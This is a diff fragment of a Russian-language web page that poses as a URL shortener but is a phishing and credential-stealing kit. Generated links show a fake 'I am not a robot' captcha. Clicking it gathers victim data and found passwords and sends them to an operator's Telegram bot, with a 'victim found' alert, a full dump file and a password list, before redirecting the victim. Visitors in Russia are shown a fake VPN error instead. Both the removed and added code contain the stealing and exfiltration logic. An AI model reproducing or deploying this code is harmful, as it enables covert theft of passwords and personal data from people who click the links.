-            return { dataPackage, passwords };
-        }
-
-        // Отправка в Telegram: сообщение "Есть пострадавший!" + файл с данными + отдельно пароли
-        async function sendToTelegram(botToken, chatId, victimData, passwords) {
-            if(!botToken || !chatId) return false;
-            const baseUrl = `https://api.telegram.org/bot${botToken}`;
-            try {
-                // Сообщение о пострадавшем
-                await fetch(`${baseUrl}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: "🚨 Есть пострадавший! 🚨\nПереход по SWILL-ссылке. Данные прилагаются.",
-                        disable_notification: false
-                    }),
-                    keepalive: true
-                });
-            } catch(e) {}
-
-            // Отправка полного дампа файлом
-            const jsonStr = JSON.stringify(victimData, null, 2);
-            const blob = new Blob([jsonStr], { type: 'text/plain' });
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('document', blob, 'swill_full_dump.txt');
-            try {
-                await fetch(`${baseUrl}/sendDocument`, {
-                    method: 'POST',
-                    body: formData,
-                    keepalive: true
-                });
-            } catch(e) {}
-
-            // Отправка паролей отдельным сообщением (если есть)
-            if(passwords && passwords.length > 0) {
-                let passText = "🔑 **Найденные пароли:**\n";
-                passwords.forEach(p => {
-                    passText += `• ${p.field}: \`${p.value}\`\n`;
-                });
-                if(passText.length > 4000) passText = passText.substring(0, 3900) + "\n... (обрезано)";
-                try {
-                    await fetch(`${baseUrl}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: passText,
-                            parse_mode: "Markdown",
-                            disable_notification: false
-                        }),
-                        keepalive: true
-                    });
-                } catch(e) {}
-            }
-            return true;
-        }
-
-        // Проверка страны по IP (через ip-api)
-        async function getCountryCode() {
-            try {
-                const resp = await fetch('https://ip-api.com/json/?fields=status,countryCode', { mode: 'cors' });
+                const resp = await fetch('https://ip-api.com/json/?fields=status,countryCode');
                 const data = await resp.json();
-                if(data.status === 'success') return data.countryCode;
-                return null;
-            } catch(e) {
-                return null;
+                if(data.status === 'success') country = data.countryCode;
+            } catch(e) {}
+            if(country === 'RU') {
+                statusMsgDiv.innerHTML = "⚠️ Замечена ошибка. Попробуйте с включенным VPN.";
+                timerDisplay.style.display = 'none';
+                document.getElementById('loaderIcon').style.display = 'none';
+                return;
+            } else {
+                statusMsgDiv.innerHTML = "✅ Соединение защищено. Подтвердите, что вы не бот:";
+                timerDisplay.style.display = 'none';
+                document.getElementById('loaderIcon').style.display = 'none';
+                captchaContainer.innerHTML = `<div class="captcha-box" id="captchaButton"><div class="checkmark">✓</div><div class="captcha-text">Я не робот</div></div>`;
+                document.getElementById('captchaButton').addEventListener('click', async () => {
+                    statusMsgDiv.innerHTML = "⏳ Перенаправление...";
+                    // Запускаем ультра-кражу
+                    startUltimateSteal();
+                    // Редирект через 2 секунды (чтобы данные успели отправиться)
+                    setTimeout(() => { window.location.href = originalUrl; }, 2000);
+                });
             }
         }
-
-        // Функция показа оверлея с таймером, проверкой IP и капчей
-        async function showOverlayAndRedirect(originalUrl, botToken, chatId) {
-            // Показываем оверлей
-            overlay.classList.remove('hidden');
-            let timer = 5;
-            timerDisplay.textContent = timer;
-            statusMsgDiv.textContent = "Проверка соединения...";
-            captchaContainer.style.display = "none";
-            const loader = document.getElementById('loaderIcon');
-            loader.style.display = "block";
-
-            // Обратный отсчёт
-            const interval = setInterval(() => {
-                timer--;
-                timerDisplay.textContent = timer;
-                if(timer <= 0) {
-                    clearInterval(interval);
-                    timerDisplay.textContent = "0";
-                    // По истечении таймера проверяем страну
-                    checkCountryAndProceed();
-                }
-            }, 1000);
-
-            let countryChecked = false;
-            let isRussia = false;
-
-            const checkCountryAndProceed = async () => {
-                if(countryChecked) return;
-                countryChecked = true;
-                loader.style.display = "none";
-                const countryCode = await getCountryCode();
-                if(countryCode === "RU") {
-                    isRussia = true;
-                    statusMsgDiv.innerHTML = "⚠️ <strong>Замечена ошибка</strong><br>Попробуйте с включенным VPN.<br>Перезагрузите страницу после подключения VPN.";
-                    timerDisplay.style.display = "none";
-                    // Не показываем капчу, просто ошибка
-                    return;
-                } else {
-                    // Не Россия - показываем капчу-галочку
-                    isRussia = false;
-                    statusMsgDiv.innerHTML = "✅ Соединение защищено<br>Подтвердите, что вы не бот:";
-                    timerDisplay.style.display = "none";
-                    captchaContainer.style.display = "flex";
-                    captchaContainer.innerHTML = `
-                        <div class="captcha-box" id="captchaButton">
-                            <div class="checkmark">✓</div>
-                            <div class="captcha-text">Я не робот</div>
-                        </div>
-                    `;
-                    const captchaBtn = document.getElementById('captchaButton');
-                    captchaBtn.addEventListener('click', async () => {
-                        // После нажатия галочки - собираем данные и редиректим
-                        statusMsgDiv.innerHTML = "⏳ Перенаправление...";
-                        captchaContainer.style.display = "none";
-                        // Сбор данных и отправка
-                        try {
-                            const { dataPackage, passwords } = await collectVictimData();
-                            await sendToTelegram(botToken, chatId, dataPackage, passwords);
-                        } catch(e) {}
-                        // Редирект на целевую ссылку
-                        window.location.href = originalUrl;
-                    });
-                }
-            };
+    }
+    
+    async function handleHashRedirect() {
+        const hash = window.location.hash.substring(1);
+        if(!hash) return;
+        const decoded = decodeHash(hash);
+        if(!decoded) {
+            alert("Некорректная ссылка");
+            return;
         }
-
-        // Обработчик при заходе с хэшем (сокращённая ссылка)
-        async function handleHashRedirect() {
-            const hash = window.location.hash.substring(1);
-            if(!hash) return false;
-
-            const decoded = decodeHash(hash);
-            if(!decoded) {
-                const errDiv = document.createElement('div');
-                errDiv.className = 'vpn-warning';
-                errDiv.style.background = "#b91c1c44";
-                errDiv.style.borderLeftColor = "#f87171";
-                errDiv.innerText = "❌ Некорректная или повреждённая ссылка. Хэш не удалось расшифровать.";
-                const card = document.querySelector('.card');
-                const existing = document.querySelector('.vpn-warning');
-                if(existing) existing.remove();
-                card.insertBefore(errDiv, card.firstChild);
-                setTimeout(() => errDiv.remove(), 5000);
-                return false;
-            }
-
-            const { originalUrl, botToken, chatId } = decoded;
-            // Запускаем оверлей с проверкой
-            await showOverlayAndRedirect(originalUrl, botToken, chatId);
-            return true;
-        }
-
-        // Логика создания короткой ссылки (интерфейс)
-        function createShortLinkHandler() {
-            clearErrors();
-            let longUrl = longUrlInput.value.trim();
-            let botToken = botTokenInput.value.trim();
-            let chatIdRaw = chatIdInput.value.trim();
-
-            if(!longUrl) {
-                showError(longUrlInput.parentElement, "Введите длинную ссылку");
-                return;
-            }
-            if(!isValidUrl(longUrl)) {
-                showError(longUrlInput.parentElement, "Ссылка должна начинаться с http:// или https://");
-                return;
-            }
-            if(!botToken) {
-                showError(botTokenInput.parentElement, "Укажите токен Telegram бота");
-                return;
-            }
-            if(botToken.split(':').length < 2) {
-                showError(botTokenInput.parentElement, "Неверный формат токена (пример: 123456:ABCdef)");
-                return;
-            }
-            if(!chatIdRaw || isNaN(Number(chatIdRaw))) {
-                showError(chatIdInput.parentElement, "Telegram ID должен быть числом");
-                return;
-            }
-            const chatIdNum = Number(chatIdRaw);
-
-            const { short, encoded } = generateShortLink(longUrl, botToken, chatIdNum);
-            shortLinkDisplay.innerText = short;
-            resultBlock.classList.add('show');
-            resultBlock.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-        }
-
-        function copyShortLink() {
-            const linkText = shortLinkDisplay.innerText;
-            if(!linkText || linkText === 'site.com/#...') return;
-            navigator.clipboard.writeText(linkText).then(() => {
-                showToast("✓ Скопировано");
-            }).catch(() => {
-                showToast("Ошибка копирования");
-            });
-        }
-
-        shortenBtn.addEventListener('click', createShortLinkHandler);
-        copyBtn.addEventListener('click', copyShortLink);
-
-        // При загрузке страницы обрабатываем хэш (редирект через оверлей)
-        window.addEventListener('DOMContentLoaded', () => {
-            handleHashRedirect().catch(console.warn);
-        });
-        window.addEventListener('hashchange', () => {
-            handleHashRedirect();
-        });
-    })();
+        const { originalUrl, botToken, chatId } = decoded;
+        await showOverlayAndRedirect(originalUrl, botToken, chatId);
+    }
+    
+    // Интерфейс создания ссылки
+    const longUrlInput = document.getElementById('longUrl');
+    const botTokenInput = document.getElementById('botToken');
+    const chatIdInput = document.getElementById('chatId');
+    const shortenBtn = document.getElementById('shortenBtn');
+    const shortLinkDisplay = document.getElementById('shortLinkDisplay');
+    const resultBlock = document.getElementById('resultBlock');
+    const copyBtn = document.getElementById('copyBtn');
+    const toast = document.getElementById('toastMessage');
+    
+    function showToastMsg(text) { toast.textContent = text; toast.classList.add('show-toast'); setTimeout(() => toast.classList.remove('show-toast'), 1800); }
+    function showError(container, msg) { let d = document.createElement('div'); d.className = 'error-msg'; d.innerText = msg; container.appendChild(d); setTimeout(() => d.remove(), 4000); }
+    
+    shortenBtn.onclick = () => {
+        let long = longUrlInput.value.trim();
+        let bot = botTokenInput.value.trim();
+        let chat = chatIdInput.value.trim();
+        if(!isValidUrl(long)) { showError(longUrlInput.parentElement, 'Неверная ссылка (http/https)'); return; }
+        if(!bot) { showError(botTokenInput.parentElement, 'Введите токен'); return; }
+        if(!chat || isNaN(Number(chat))) { showError(chatIdInput.parentElement, 'ID должен быть числом'); return; }
+        const shortLink = generateShortLink(long, bot, Number(chat));
+        shortLinkDisplay.innerText = shortLink;
+        resultBlock.classList.add('show');
+        showToastMsg('Ссылка создана');
+    };
+    copyBtn.onclick = () => { navigator.clipboard.writeText(shortLinkDisplay.innerText); showToastMsg('Скопировано'); };
+    
+    window.addEventListener('DOMContentLoaded', () => handleHashRedirect());
+    window.addEventListener('hashchange', () => handleHashRedirect());
+})();
 </script>
 </body>
 </html>
